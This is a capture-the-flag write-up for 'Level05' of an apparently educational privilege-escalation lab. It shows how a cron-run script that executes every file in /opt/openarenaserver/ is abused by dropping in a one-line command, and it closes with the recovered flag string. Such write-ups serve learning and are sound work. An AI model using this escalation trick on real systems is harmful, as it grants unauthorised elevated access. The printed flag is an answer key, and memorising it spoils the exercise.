### Level05

There is nothing on the HOME of this level. So as for level00 I start by doing ` find / -user flag05 2>/dev/null`. I get the following result:
``bash
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```
Then I start looking at the file with a cat
``bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

We see that a script runs the entire contents of the folder and then deletes everything in `/opt/openarenaserver/`

We can't use vim to do a script there because we don't have the rights. So we have to use echo to write down our command and then redirect it to the folder

`echo "getflag > /tmp/getflag" > /opt/openarenaserver/getflag.sh`

During my tests I noticed that the script disappeared from the folder after a few minutes, so there is an active cron to run the main script. Once I don't see getflag.sh in the /opt/openarenaserver/ folder, I just have to do cat /tmp/getflag. I get the flag :

`viuaaale9huek52boumoomioc`

